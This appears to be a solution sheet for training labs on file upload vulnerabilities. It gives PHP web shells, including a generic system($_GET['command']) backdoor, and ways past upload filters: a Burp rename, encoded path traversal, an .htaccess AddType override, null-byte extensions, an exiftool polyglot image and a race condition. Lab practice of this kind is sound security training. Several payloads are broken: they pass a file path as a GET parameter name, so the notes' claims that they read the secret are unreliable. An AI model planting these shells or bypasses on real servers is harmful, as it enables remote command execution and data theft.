

<!--File upload to get webshell -->

<!--Answers for file upload 1 -->
<!--Note to view file the contents of the secret, You need to preform http request to the path where the website server stores and getting the files -->

<?php echo file_get_contents('/home/carlos/secret'); ?>



<!--Answers for file upload 2 -->
<!--Note the server accpets only images file so, You need to create a php file and then add .png/.jpeg/etc and see that the server got the file -->
<!--From there you need to change in Brup Repeatr the exploit.php.jpeg to exploit.php and send to server -->
<!-- See the sever got the exploit.php, From there use GET request to see file contents -->

<?php echo file_get_contents('/home/carlos/secret'); ?>





<!--Answer for file upload 3-->
<!--Note the server accpets any file type, But don't execute the files. So we need to change the path of the exploit file from /files/avatar/exploit to /files/exploit -->
<!--If we look closly at filename we can edit where the exploit.php will be placed. We need to encode / inorder to make linux command to the server -->
<?php echo system($_GET['command']); ?>




<!--Answer for file upload 4-->
<!--Note here the server don't accept .php, but can accpet php5/etc.. inorder for the server to run the exploit file we need to reconfigure the server to run php code -->


<!--The file is .htaccess, Because the server won't run .php we can configure that .any exstion the server will run it as php code -->
AddType application/x-httpd-php .write here anything

<!-- Exploit.shell -->

<?php echo system($_GET['/home/carlos/secret']); ?>




<!--Answer for file upload 5 -->

<!--Note here the server don't accept any files that don't contain .jpg in them so, In order to to pass exploit.php, We need to use encoding of null bytes that will be tranlasted in the compiler server -->
<!--For example, exploit.php%00.jpg - this file stored in the server, But when the server doing GET on the file its exploit.php -->

<?php echo system($_GET['/home/carlos/secret']); ?>

<!--Can also use this -->

<?php echo system($_GET['command']); ?>






<!-- Answer for file upload 6 -->

<!-- Note in order to solve this lab you need to use exiftool to generate a php file with the code you want with diemstions of an image. But in reality its a php file with malicious  code -->

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ws.jpg -o polyglot.php2







<!-- Answer for file upload 7 -->

<!-- Note in order to solve this lab you have to find the exploit in the code, In this context of the lab before proccing the file it was stored in internal system which attack can fetch from the server and execute it -->
<!-- If he quick enough to do so, In burp you can use the group request ability and tries the requests options to make a successful exection of the exploit.php -->
 
<?php echo file_get_contents('/home/carlos/secret'); ?>
